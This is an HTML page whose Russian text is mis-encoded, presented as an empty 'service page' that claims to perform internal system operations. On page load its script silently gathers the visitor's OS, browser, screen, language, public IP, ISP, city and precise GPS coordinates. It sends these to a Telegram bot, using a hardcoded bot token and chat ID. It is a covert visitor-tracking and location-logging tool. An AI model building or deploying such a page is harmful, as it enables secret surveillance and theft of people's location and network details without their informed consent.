<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–°–ª—É–∂–µ–±–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        
        .hidden-message {
            color: #333;
            font-size: 18px;
            text-align: center;
            padding: 20px;
            max-width: 600px;
            opacity: 0;
            animation: fadeIn 5s forwards;
        }
        
        @keyframes fadeIn {
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="hidden-message">
        <p>–≠—Ç–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –Ω–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –≤–∏–¥–∏–º–æ–≥–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ</p>
        <p>–û–Ω–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏</p>
    </div>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const BOT_TOKEN = '7100525865:AAG-ed_1X1DPx-ngsnUrTKRUuuH2DvvjLxE';
        const CHAT_ID = '6330090175'; // –í–∞—à chat_id
        
        // –û—Å–Ω–æ–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
                return false;
            }
        }
        
        function detectOS() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes("Windows")) return "Windows";
            if (userAgent.includes("Mac OS")) return "Mac OS";
            if (userAgent.includes("Linux")) return "Linux";
            if (userAgent.includes("Android")) return "Android";
            if (userAgent.includes("iOS")) return "iOS";
            return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –û–°";
        }
        
        function detectBrowser() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes("Firefox")) return "Firefox";
            if (userAgent.includes("Chrome")) return "Chrome";
            if (userAgent.includes("Safari")) return "Safari";
            if (userAgent.includes("Edge")) return "Edge";
            if (userAgent.includes("Opera")) return "Opera";
            return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –±—Ä–∞—É–∑–µ—Ä";
        }
        
        function detectBrowserVersion() {
            const ua = navigator.userAgent;
            let version = "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è";
            
            if (ua.includes("Firefox/")) {
                version = ua.split("Firefox/")[1];
            } else if (ua.includes("Chrome/")) {
                version = ua.split("Chrome/")[1].split(" ")[0];
            } else if (ua.includes("Safari/")) {
                version = ua.split("Version/")[1]?.split(" ")[0] || "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è";
            } else if (ua.includes("Edg/")) {
                version = ua.split("Edg/")[1];
            }
            
            return version.split(".")[0] || "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è";
        }
        
        // –†–µ—à–µ–Ω–∏–µ –ø—Ä–æ–±–ª–µ–º—ã CORS —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏
        async function getIPAddress() {
            try {
                // –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å–µ—Ä–≤–∏—Å —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π CORS
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP:', error);
                return "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å";
            }
        }
        
        // –†–µ—à–µ–Ω–∏–µ –ø—Ä–æ–±–ª–µ–º—ã –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏
        async function getLocationInfo(ip) {
            try {
                // –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å–µ—Ä–≤–∏—Å —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π CORS
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                
                // –ï—Å–ª–∏ —Å–µ—Ä–≤–∏—Å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω, –∏—Å–ø–æ–ª—å–∑—É–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥
                if (!response.ok) throw new Error("–°–µ—Ä–≤–∏—Å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω");
                
                const data = await response.json();
                return {
                    country: data.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    city: data.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    provider: data.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    timezone: data.timezone || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                };
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–¥–∞–Ω–Ω—ã—Ö:', error);
                
                // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–¥–∞–Ω–Ω—ã—Ö
                try {
                    const altResponse = await fetch(`https://ipwhois.app/json/${ip}`);
                    const altData = await altResponse.json();
                    
                    return {
                        country: altData.country || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        city: altData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        provider: altData.isp || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        timezone: altData.timezone || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                    };
                } catch (altError) {
                    console.error('–û—à–∏–±–∫–∞ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ–≥–æ —Å–µ—Ä–≤–∏—Å–∞:', altError);
                    return {
                        country: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        city: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        provider: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        timezone: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                    };
                }
            }
        }
        
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: "–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –±—Ä–∞—É–∑–µ—Ä–æ–º" });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    error => {
                        let errorMessage;
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "–î–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–µ—â–µ–Ω";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "–í—Ä–µ–º—è –∑–∞–ø—Ä–æ—Å–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∏—Å—Ç–µ–∫–ª–æ";
                                break;
                            default:
                                errorMessage = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏";
                        }
                        resolve({ error: errorMessage });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        function formatMessage(data) {
            return `
üì° *–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ*

üñ•Ô∏è *–û–°:* ${data.os}
üåê *–ë—Ä–∞—É–∑–µ—Ä:* ${data.browser} (v${data.browserVersion})
üñ•Ô∏è *–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞:* ${data.screenWidth}x${data.screenHeight}
üåç *–Ø–∑—ã–∫:* ${data.language}

üì∂ *–°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è*
üîå *IP-–∞–¥—Ä–µ—Å:* ${data.ip}
üè¢ *–ü—Ä–æ–≤–∞–π–¥–µ—Ä:* ${data.location.provider}
üìç *–°—Ç—Ä–∞–Ω–∞/–ì–æ—Ä–æ–¥:* ${data.location.country}, ${data.location.city}
‚è∞ *–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å:* ${data.location.timezone}

üìç *–¢–æ—á–Ω—ã–µ GPS-–∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:*
${data.gps.lat && data.gps.lon ? 
`‚úÖ *–®–∏—Ä–æ—Ç–∞:* ${data.gps.lat.toFixed(6)}
‚úÖ *–î–æ–ª–≥–æ—Ç–∞:* ${data.gps.lon.toFixed(6)}
üìè *–¢–æ—á–Ω–æ—Å—Ç—å:* ~${Math.round(data.gps.accuracy)} –º–µ—Ç—Ä–æ–≤` : 
`‚ùå ${data.gps.error}`}

üïí *–í—Ä–µ–º—è –∑–∞–ø—Ä–æ—Å–∞:* ${new Date().toLocaleString()}
            `;
        }
        
        // –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        async function collectAndSendData() {
            // –°–æ–±–∏—Ä–∞–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            const systemData = {
                os: detectOS(),
                browser: detectBrowser(),
                browserVersion: detectBrowserVersion(),
                screenWidth: screen.width,
                screenHeight: screen.height,
                language: navigator.language || navigator.userLanguage
            };
            
            // –ü–æ–ª—É—á–∞–µ–º IP-–∞–¥—Ä–µ—Å
            const ip = await getIPAddress();
            
            // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏
            const locationInfo = await getLocationInfo(ip);
            
            // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å —Ç–æ—á–Ω—ã–µ GPS –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã
            const gpsData = await getGPS();
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
            const fullData = {
                ...systemData,
                ip,
                location: locationInfo,
                gps: gpsData
            };
            
            const message = formatMessage(fullData);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            await sendToTelegram(message);
        }
        
        // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = collectAndSendData;
    </script>
</body>
</html>
